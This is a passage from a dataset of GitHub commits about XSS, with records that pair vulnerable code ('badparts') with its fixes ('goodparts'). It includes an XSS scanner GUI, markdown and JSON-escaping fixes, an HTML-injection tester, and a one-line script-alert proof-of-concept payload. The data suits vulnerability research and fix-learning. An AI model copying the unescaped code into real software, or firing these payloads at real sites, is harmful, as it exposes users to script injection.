blue').grid(row=5)\nLabel(main, text = \"HTTP Proxy:\",background='light sky blue').grid(row=6)\nLabel(main, text = \"Refresh:\",background='light sky blue').grid(row=7)\nLabel(main, text = \"Crawl\",background='light sky blue').grid(row=8)\nLabel(main, text = \"\",background='light sky blue').grid(row=9)\nLabel(main, text = \"\",background='light sky blue').grid(row=10)\n\nua=[\"\"]\nua+=bane.ua\nli=bane.read_file('xss.txt')\npl=[]\nfor x in li:\n pl.append(x.strip())\nprox=[\"\"]\nprox+=bane.http(200)\nglobal target\ntarget = Entry(main)\ntarget.insert(0,'http://')\nglobal cookie\ncookie=Entry(main)\nglobal method\nmethod= ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"])\nglobal timeout\ntimeout=ttk.Combobox(main, values=range(1,61))\ntimeout.current(14)\nglobal user_agent\nuser_agent=ttk.Combobox(main, values=ua)\nuser_agent.current(1)\nglobal payload\npayload = ttk.Combobox(main, values=pl)\npayload.current(0)\nglobal proxy\nproxy=ttk.Combobox(main, values=prox)\nglobal refresh\nrefresh=ttk.Combobox(main, values=[\"On\", \"Off\"])\nglobal crawl\ncrawl=ttk.Combobox(main, values=[\"On\", \"Off\"])\n\ntarget.grid(row=0, column=1)\ntarget.config(width=30)\ncookie.grid(row=1, column=1)\ncookie.config(width=30)\nmethod.grid(row=2, column=1)\nmethod.current(0)\nmethod.config(width=30)\ntimeout.grid(row=3, column=1)\ntimeout.config(width=30)\nuser_agent.grid(row=4, column=1)\nuser_agent.config(width=30)\npayload.grid(row=5, column=1)\npayload.config(width=30)\nproxy.grid(row=6, column=1)\nproxy.current(0)\nproxy.config(width=30)\nrefresh.grid(row=7, column=1)\nrefresh.current(1)\nrefresh.config(width=30)\ncrawl.grid(row=8, column=1)\ncrawl.current(0)\ncrawl.config(width=30)\n\nButton(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)\nButton(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)\nButton(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4)\nLabel(main, text = \"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1)\nmainloop()\n"
                }
            },
            "msg": "Update xss.py"
        }
    },
    "https://github.com/Cheng-mq1216/production-practice": {
        "333dc34f5feada55d1f6ff1255949ca00dec0f9c": {
            "url": "https://api.github.com/repos/Cheng-mq1216/production-practice/commits/333dc34f5feada55d1f6ff1255949ca00dec0f9c",
            "html_url": "https://github.com/Cheng-mq1216/production-practice/commit/333dc34f5feada55d1f6ff1255949ca00dec0f9c",
            "message": ":fire: SAFETY CHANGE\n\n\u66f4\u65b0\u4e86markdown\u6e32\u67d3\u7b56\u7565\u3002\u9632\u6b62XSS\u6ce8\u5165\u3002",
            "sha": "333dc34f5feada55d1f6ff1255949ca00dec0f9c",
            "keyword": "XSS change",
            "diff": "diff --git a/app/Index/forms.py b/app/Index/forms.py\ndeleted file mode 100644\nindex e69de29..0000000\ndiff --git a/app/Index/views.py b/app/Index/views.py\nindex 05263ea..f92e8e2 100644\n--- a/app/Index/views.py\n+++ b/app/Index/views.py\n@@ -27,11 +27,28 @@\n \n # \u5bfc\u5165Markdown\u6e32\u67d3\u63d2\u4ef6\n from markdown import markdown\n+from markdown.extensions import Extension\n \n # \u5bfc\u5165\u6a21\u578b\n from .models import Article, Category, Comment\n \n \n+class EscapeHtml(Extension):\n+    def extendMarkdown(self, md):\n+        md.preprocessors.deregister('html_block')\n+        md.inlinePatterns.deregister('html')\n+\n+\n+def safe_md(string):\n+    return markdown(string,\n+                    extensions=[\n+                        'markdown.extensions.extra',\n+                        'markdown.extensions.codehilite',\n+                        'markdown.extensions.toc',\n+                        EscapeHtml()\n+                    ], safe_mode=True)\n+\n+\n class ArticleForm(forms.ModelForm):\n     class Meta:\n         model = Article\n@@ -77,11 +94,7 @@ class ArticlesList(ListView):\n     def get_queryset(self, **kwargs):\n         queryset = Article.objects.order_by('-time')\n         for i in queryset:\n-            i.md = markdown(i.content, extensions=[\n-                'markdown.extensions.extra',\n-                'markdown.extensions.codehilite',\n-                'markdown.extensions.toc',\n-            ])\n+            i.md = safe_md(i.content)\n \n         return queryset\n \n@@ -104,12 +117,7 @@ def get_context_data(self, **kwargs):\n         context = super().get_context_data(**kwargs)\n         context['comments'] = self.object.comment_set.all().order_by('-time')\n         context['form'] = self.get_form()\n-        context['md'] = markdown(self.object.content,\n-                                 extensions=[\n-                                     'markdown.extensions.extra',\n-                                     'markdown.extensions.codehilite',\n-                                     'markdown.extensions.toc',\n-                                 ])\n+        context['md'] = safe_md(self.object.content)\n \n         return context\n \n",
            "files": {
                "/app/Index/views.py": {
                    "changes": [
                        {
                            "diff": "\n     def get_queryset(self, **kwargs):\n         queryset = Article.objects.order_by('-time')\n         for i in queryset:\n-            i.md = markdown(i.content, extensions=[\n-                'markdown.extensions.extra',\n-                'markdown.extensions.codehilite',\n-                'markdown.extensions.toc',\n-            ])\n+            i.md = safe_md(i.content)\n \n         return queryset\n \n",
                            "add": 1,
                            "remove": 5,
                            "filename": "/app/Index/views.py",
                            "badparts": [
                                "            i.md = markdown(i.content, extensions=[",
                                "                'markdown.extensions.extra',",
                                "                'markdown.extensions.codehilite',",
                                "                'markdown.extensions.toc',",
                                "            ])"
                            ],
                            "goodparts": [
                                "            i.md = safe_md(i.content)"
                            ]
                        },
                        {
                            "diff": "\n         context = super().get_context_data(**kwargs)\n         context['comments'] = self.object.comment_set.all().order_by('-time')\n         context['form'] = self.get_form()\n-        context['md'] = markdown(self.object.content,\n-                                 extensions=[\n-                                     'markdown.extensions.extra',\n-                                     'markdown.extensions.codehilite',\n-                                     'markdown.extensions.toc',\n-                                 ])\n+        context['md'] = safe_md(self.object.content)\n \n         return context\n \n",
                            "add": 1,
                            "remove": 6,
                            "filename": "/app/Index/views.py",
                            "badparts": [
                                "        context['md'] = markdown(self.object.content,",
                                "                                 extensions=[",
                                "                                     'markdown.extensions.extra',",
                                "                                     'markdown.extensions.codehilite',",
                                "                                     'markdown.extensions.toc',",
                                "                                 ])"
                            ],
                            "goodparts": [
                                "        context['md'] = safe_md(self.object.content)"
                            ]
                        }
                    ],
                    "source": "\n\nimport hashlib from django import forms from django.contrib.auth import authenticate, login, logout from django.contrib.auth.forms import UserCreationForm, PasswordChangeForm from django.contrib.auth.models import User from django.contrib.auth.decorators import login_required from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin from django.core.paginator import EmptyPage, PageNotAnInteger, Paginator from django.http import HttpResponse from django.urls import reverse from django.template import RequestContext from django.shortcuts import Http404, redirect, render, render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm): class Meta: model=Article fields=['title', 'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['articles']=self.object.article_set.all() context['form']=CommentForm() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article.objects.order_by('-time') for i in queryset: i.md=markdown(i.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html' form_class=CommentForm def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['comments']=self.object.comment_set.all().order_by('-time') context['form']=self.get_form() context['md']=markdown(self.object.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\", \"iPad\", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class=ArticleForm success_url='/' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.article.pk}) def test_func(self): return self.request.user==self.get_object().author ",
                    "sourceWithComments": "# \u52a0\u5bc6\u7b97\u6cd5\u5305\nimport hashlib\n\nfrom django import forms\n\n# \u5bfc\u5165\u6743\u9650\u63a7\u5236\u7c7b\nfrom django.contrib.auth import authenticate, login, logout\nfrom django.contrib.auth.forms import UserCreationForm, PasswordChangeForm\nfrom django.contrib.auth.models import User\nfrom django.contrib.auth.decorators import login_required\nfrom django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin\n\n# \u5bfc\u5165\u5206\u9875\u63d2\u4ef6\u5305\nfrom django.core.paginator import EmptyPage, PageNotAnInteger, Paginator\nfrom django.http import HttpResponse\nfrom django.urls import reverse\n\n# \u5bfc\u5165\u8bf7\u6c42\u4e0a\u4e0b\u6587\u6a21\u7248\nfrom django.template import RequestContext\n\n# \u5bfc\u5165\u5feb\u6377\u51fd\u6570\nfrom django.shortcuts import Http404, redirect, render, render_to_response\n\n# \u5bfc\u5165\u6a21\u578b\u89c6\u56fe\nfrom django.views.generic import ListView, DetailView\nfrom django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin\n\n# \u5bfc\u5165Markdown\u6e32\u67d3\u63d2\u4ef6\nfrom markdown import markdown\n\n# \u5bfc\u5165\u6a21\u578b\nfrom .models import Article, Category, Comment\n\n\nclass ArticleForm(forms.ModelForm):\n    class Meta:\n        model = Article\n        fields = ['title', 'category', 'content']\n\n\nclass CommentForm(forms.ModelForm):\n    class Meta:\n        model = Comment\n        fields = ['content']\n\n\nclass UserDetail(DetailView):\n    model = User\n    template_name = 'user.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['articles'] = self.object.article_set.all()\n        context['form'] = CommentForm()\n        return context\n\n\nclass RegisterFormView(FormView):\n    \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\"\n    template_name = 'register.html'\n    form_class = UserCreationForm\n    success_url = '/login/'\n\n    def form_valid(self, form):\n        \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\"\n        form.save()\n        return super().form_valid(form)\n\n\nclass ArticlesList(ListView):\n    \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\"\n    model = Article\n    context_object_name = 'articles'\n    template_name = 'index.html'\n    paginate_by = 5\n\n    def get_queryset(self, **kwargs):\n        queryset = Article.objects.order_by('-time')\n        for i in queryset:\n            i.md = markdown(i.content, extensions=[\n                'markdown.extensions.extra',\n                'markdown.extensions.codehilite',\n                'markdown.extensions.toc',\n            ])\n\n        return queryset\n\n\nclass ArticleDetail(DetailView, FormMixin):\n    \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002\n    \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a\n    FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002\n    \"\"\"\n    model = Article\n    # model.content = markdown(model.content)\n    context_object_name = 'article'\n    template_name = 'details.html'\n    form_class = CommentForm\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.pk})\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['comments'] = self.object.comment_set.all().order_by('-time')\n        context['form'] = self.get_form()\n        context['md'] = markdown(self.object.content,\n                                 extensions=[\n                                     'markdown.extensions.extra',\n                                     'markdown.extensions.codehilite',\n                                     'markdown.extensions.toc',\n                                 ])\n\n        return context\n\n    def post(self, request, *args, **kwargs):\n        self.object = self.get_object()\n        form = self.get_form()\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.form_invalid(form)\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.article = self.object\n        a.save()\n        return super().form_valid(form)\n\n\ndef is_mobile(useragent):\n    devices = [\"Android\", \"iPhone\", \"SymbianOS\",\n               \"Windows Phone\", \"iPad\", \"iPod\"]\n\n    for d in devices:\n        if d in useragent:\n            return True\n\n    return False\n\n\nclass ArticleFormView(LoginRequiredMixin, FormView):\n    \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\"\n\n    model = Article\n    template_name = 'post.html'\n    context_object_name = 'articles'\n    form_class = ArticleForm\n    success_url = '/'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.save()\n        return super().form_valid(form)\n\n\nclass ArticleUpdateView(UserPassesTestMixin, UpdateView):\n    \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\"\n    model = Article\n    success_url = '/'\n    fields = ['content', 'category']\n    template_name = 'update.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass ArticleDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\"\n    model = Article\n    success_url = '/'\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass CommentDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\"\n    model = Comment\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.article.pk})\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n"
                }
            },
            "msg": ":fire: SAFETY CHANGE\n\n\u66f4\u65b0\u4e86markdown\u6e32\u67d3\u7b56\u7565\u3002\u9632\u6b62XSS\u6ce8\u5165\u3002"
        }
    },
    "https://github.com/onefork/pontoon-sr": {
        "fc07ed9c68e08d41f74c078b4e7727f1a0888be8": {
            "url": "https://api.github.com/repos/onefork/pontoon-sr/commits/fc07ed9c68e08d41f74c078b4e7727f1a0888be8",
            "html_url": "https://github.com/onefork/pontoon-sr/commit/fc07ed9c68e08d41f74c078b4e7727f1a0888be8",
            "sha": "fc07ed9c68e08d41f74c078b4e7727f1a0888be8",
            "keyword": "XSS vulnerable",
            "diff": "diff --git a/pontoon/batch/views.py b/pontoon/batch/views.py\nindex 0952f6dd..72afa80f 100644\n--- a/pontoon/batch/views.py\n+++ b/pontoon/batch/views.py\n@@ -112,7 +112,7 @@ def batch_edit_translations(request):\n     \"\"\"\n     form = forms.BatchActionsForm(request.POST)\n     if not form.is_valid():\n-        return HttpResponseBadRequest(form.errors.as_json())\n+        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))\n \n     locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n     entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n",
            "message": "",
            "files": {
                "/pontoon/batch/views.py": {
                    "changes": [
                        {
                            "diff": "\n     \"\"\"\n     form = forms.BatchActionsForm(request.POST)\n     if not form.is_valid():\n-        return HttpResponseBadRequest(form.errors.as_json())\n+        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))\n \n     locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n     entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/pontoon/batch/views.py",
                            "badparts": [
                                "        return HttpResponseBadRequest(form.errors.as_json())"
                            ],
                            "goodparts": [
                                "        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))"
                            ]
                        }
                    ],
                    "source": "\nimport logging from bulk_update.helper import bulk_update from django.contrib.auth.decorators import login_required from django.db import transaction from django.http import( HttpResponseBadRequest, HttpResponseForbidden, JsonResponse, ) from django.shortcuts import get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base.models import( ChangedEntityLocale, Entity, Locale, Project, ProjectLocale, TranslationMemoryEntry, Translation, ) from pontoon.base.utils import( require_AJAX, readonly_exists, ) from pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"\"Update stats on a list of TranslatedResource. \"\"\" projects=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields=[ 'total_strings', 'approved_strings', 'fuzzy_strings', 'strings_with_errors', 'strings_with_warnings', 'unreviewed_strings', ]) locale.aggregate_stats() for project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed, for later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale.objects .values_list('entity', 'locale') .distinct() ) for changed_entity in changed_entities: key=(changed_entity.pk, locale.pk) if key not in existing: changed_entities_array.append( ChangedEntityLocale(entity=changed_entity, locale=locale) ) ChangedEntityLocale.objects.bulk_create(changed_entities_array) def update_translation_memory(changed_translation_pks, project, locale): \"\"\"Update translation memory for a list of translations. \"\"\" memory_entries=[ TranslationMemoryEntry( source=t.entity.string, target=t.string, locale=locale, entity=t.entity, translation=t, project=project, ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name='', login_url='/403') @require_POST @require_AJAX @transaction.atomic def batch_edit_translations(request): \"\"\"Perform an action on a list of translations. Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view are defined in `models.BatchActionsForm`. \"\"\" form=forms.BatchActionsForm(request.POST) if not form.is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects=Project.objects.filter(pk__in=projects_pk.distinct()) for project in projects: if( not request.user.can_translate(project=project, locale=locale) or readonly_exists(projects, locale) ): return HttpResponseForbidden( \"Forbidden: You don't have permission for batch editing\" ) active_translations=Translation.objects.filter( active=True, locale=locale, entity__in=entities, ) action_function=ACTIONS_FN_MAP[form.cleaned_data['action']] action_status=action_function( form, request.user, active_translations, locale, ) if action_status.get('error'): return JsonResponse(action_status) invalid_translation_count=len(action_status.get('invalid_translation_pks',[])) if action_status['count']==0: return JsonResponse({ 'count': 0, 'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation(action_status['changed_entities'], locale) if action_status['latest_translation_pk']: Translation.objects.get( pk=action_status['latest_translation_pk'] ).update_latest_translation() update_translation_memory( action_status['changed_translation_pks'], project, locale ) return JsonResponse({ 'count': action_status['count'], 'invalid_translation_count': invalid_translation_count, }) ",
                    "sourceWithComments": "import logging\n\nfrom bulk_update.helper import bulk_update\n\nfrom django.contrib.auth.decorators import login_required\nfrom django.db import transaction\nfrom django.http import (\n    HttpResponseBadRequest,\n    HttpResponseForbidden,\n    JsonResponse,\n)\nfrom django.shortcuts import get_object_or_404\nfrom django.views.decorators.http import (\n    require_POST\n)\n\nfrom pontoon.base.models import (\n    ChangedEntityLocale,\n    Entity,\n    Locale,\n    Project,\n    ProjectLocale,\n    TranslationMemoryEntry,\n    Translation,\n)\nfrom pontoon.base.utils import (\n    require_AJAX,\n    readonly_exists,\n)\nfrom pontoon.batch import forms\nfrom pontoon.batch.actions import ACTIONS_FN_MAP\n\n\nlog = logging.getLogger(__name__)\n\n\ndef update_stats(translated_resources, locale):\n    \"\"\"Update stats on a list of TranslatedResource.\n    \"\"\"\n    projects = set()\n    for translated_resource in translated_resources:\n        projects.add(translated_resource.resource.project)\n        translated_resource.calculate_stats(save=False)\n\n    bulk_update(translated_resources, update_fields=[\n        'total_strings',\n        'approved_strings',\n        'fuzzy_strings',\n        'strings_with_errors',\n        'strings_with_warnings',\n        'unreviewed_strings',\n    ])\n\n    locale.aggregate_stats()\n\n    for project in projects:\n        project.aggregate_stats()\n        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()\n\n\ndef mark_changed_translation(changed_entities, locale):\n    \"\"\"Mark entities as changed, for later sync.\n    \"\"\"\n    changed_entities_array = []\n    existing = (\n        ChangedEntityLocale.objects\n        .values_list('entity', 'locale')\n        .distinct()\n    )\n    for changed_entity in changed_entities:\n        key = (changed_entity.pk, locale.pk)\n\n        # Remove duplicate changes to prevent unique constraint violation.\n        if key not in existing:\n            changed_entities_array.append(\n                ChangedEntityLocale(entity=changed_entity, locale=locale)\n            )\n\n    ChangedEntityLocale.objects.bulk_create(changed_entities_array)\n\n\ndef update_translation_memory(changed_translation_pks, project, locale):\n    \"\"\"Update translation memory for a list of translations.\n    \"\"\"\n    memory_entries = [\n        TranslationMemoryEntry(\n            source=t.entity.string,\n            target=t.string,\n            locale=locale,\n            entity=t.entity,\n            translation=t,\n            project=project,\n        ) for t in (\n            Translation.objects\n            .filter(pk__in=changed_translation_pks)\n            .prefetch_related('entity__resource')\n        )\n    ]\n    TranslationMemoryEntry.objects.bulk_create(memory_entries)\n\n\n@login_required(redirect_field_name='', login_url='/403')\n@require_POST\n@require_AJAX\n@transaction.atomic\ndef batch_edit_translations(request):\n    \"\"\"Perform an action on a list of translations.\n\n    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view\n    are defined in `models.BatchActionsForm`.\n\n    \"\"\"\n    form = forms.BatchActionsForm(request.POST)\n    if not form.is_valid():\n        return HttpResponseBadRequest(form.errors.as_json())\n\n    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n\n    if not entities.exists():\n        return JsonResponse({'count': 0})\n\n    # Batch editing is only available to translators. Check if user has\n    # translate permissions for all of the projects in passed entities.\n    # Also make sure projects are not enabled in read-only mode for a locale.\n    projects_pk = entities.values_list('resource__project__pk', flat=True)\n    projects = Project.objects.filter(pk__in=projects_pk.distinct())\n\n    for project in projects:\n        if (\n            not request.user.can_translate(project=project, locale=locale)\n            or readonly_exists(projects, locale)\n        ):\n            return HttpResponseForbidden(\n                \"Forbidden: You don't have permission for batch editing\"\n            )\n\n    # Find all impacted active translations, including plural forms.\n    active_translations = Translation.objects.filter(\n        active=True,\n        locale=locale,\n        entity__in=entities,\n    )\n\n    # Execute the actual action.\n    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]\n    action_status = action_function(\n        form,\n        request.user,\n        active_translations,\n        locale,\n    )\n\n    if action_status.get('error'):\n        return JsonResponse(action_status)\n\n    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))\n    if action_status['count'] == 0:\n        return JsonResponse({\n            'count': 0,\n            'invalid_translation_count': invalid_translation_count,\n        })\n\n    update_stats(action_status['translated_resources'], locale)\n    mark_changed_translation(action_status['changed_entities'], locale)\n\n    # Update latest translation.\n    if action_status['latest_translation_pk']:\n        Translation.objects.get(\n            pk=action_status['latest_translation_pk']\n        ).update_latest_translation()\n\n    update_translation_memory(\n        action_status['changed_translation_pks'],\n        project,\n        locale\n    )\n\n    return JsonResponse({\n        'count': action_status['count'],\n        'invalid_translation_count': invalid_translation_count,\n    })\n"
                }
            },
            "msg": "Fix an XSS vulnerability in batch/views.py\n\nAs a Proof of Concept consider an AJAX POST request to\nhttps://pontoon.mozilla.org/batch-edit-translations/ with\n\"action\" parameter set to \"<script>alert('xss')</script>\"."
        }
    },
    "https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024": {
        "3bff7f7c85651b69558a81facf29929d826eb095": {
            "url": "https://api.github.com/repos/GrzechuG/PWR-CBE-BAW-mutillidae-2024/commits/3bff7f7c85651b69558a81facf29929d826eb095",
            "html_url": "https://github.com/GrzechuG/PWR-CBE-BAW-mutillidae-2024/commit/3bff7f7c85651b69558a81facf29929d826eb095",
            "sha": "3bff7f7c85651b69558a81facf29929d826eb095",
            "keyword": "XSS change",
            "diff": "diff --git a/skrypty/Tester/CompareDiff.py b/skrypty/Tester/CompareDiff.py\nindex f76868e..7c66ac3 100644\n--- a/skrypty/Tester/CompareDiff.py\n+++ b/skrypty/Tester/CompareDiff.py\n@@ -28,25 +28,25 @@ def get_page_htmli_header(url, data):\n     soup = BeautifulSoup(page.content, \"html.parser\")\n     return str(soup)\n \n+\n def get_page_htmli_cookie(url, data):\n     page = requests.get(url, cookies=data, verify=False)\n     soup = BeautifulSoup(page.content, \"html.parser\")\n     return str(soup)\n \n+\n def compare_page_htmli(url, inj, cookie):\n     page_text_normal = get_page_text(url)\n     if cookie == False:\n-        header = {\n-        \"User-Agent\": inj\n-        }\n+        header = {\"User-Agent\": inj}\n         page = get_page_htmli_header(url, header)\n     else:\n         get_header = requests.get(url)\n         get_cookie = get_header.cookies\n-        get_cookie_name = list(get_cookie.keys())[0] #ostatni\n+        get_cookie_name = list(get_cookie.keys())[0]  # ostatni\n         get_cookie.update({get_cookie_name: get_cookie.get(get_cookie_name) + inj})\n         page = get_page_htmli_cookie(url, get_cookie)\n-   \n+\n     diff = difflib.unified_diff(\n         page_text_normal.splitlines(), page.splitlines(), lineterm=\"\"\n     )\ndiff --git a/skrypty/Tester/Exploitation.py b/skrypty/Tester/Exploitation.py\nindex b42941c..043bb82 100644\n--- a/skrypty/Tester/Exploitation.py\n+++ b/skrypty/Tester/Exploitation.py\n@@ -5,7 +5,7 @@\n     list_to_dict,\n     generate_data_forms,\n     find_forms,\n-    compare_page_htmli\n+    compare_page_htmli,\n )\n \n \n@@ -18,7 +18,7 @@ def http_pollution(url, params):\n \n     element_dict = {}\n     for item in params:\n-        key, value = item.split('=')\n+        key, value = item.split(\"=\")\n         element_dict[key] = value\n \n     for key, value in element_dict.items():\n@@ -81,9 +81,8 @@ def htmli(url, type, forms):\n         return compare_pages_post(url, forms[0])\n \n     elif type == \"Header\":\n-        return compare_page_htmli(url, inj, cookie=False)   \n+        return compare_page_htmli(url, inj, cookie=False)\n     elif type == \"Cookie\":\n         return compare_page_htmli(url, inj, cookie=True)\n     else:\n         return \"Wrong parameter\"\n-\ndiff --git a/skrypty/Tester/Tester.py b/skrypty/Tester/Tester.py\nindex 4253ccf..fdeb7f3 100644\n--- a/skrypty/Tester/Tester.py\n+++ b/skrypty/Tester/Tester.py\n@@ -4,10 +4,17 @@\n \n def main():\n     parser = argparse.ArgumentParser(description=\"Por\u00f3wnuje dwie strony HTML.\")\n-    parser.add_argument(\"--url\", type=str, help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\")\n+    parser.add_argument(\n+        \"--url\",\n+        type=str,\n+        help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\",\n+    )\n     parser.add_argument(\"--http-polution\", action=\"store_true\", help=\"HTTP polution\")\n     parser.add_argument(\n-        \"--parameter\", nargs=\"*\", type=str, help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"'\n+        \"--parameter\",\n+        nargs=\"*\",\n+        type=str,\n+        help='Podaj parametry GET po spacjach w formacie 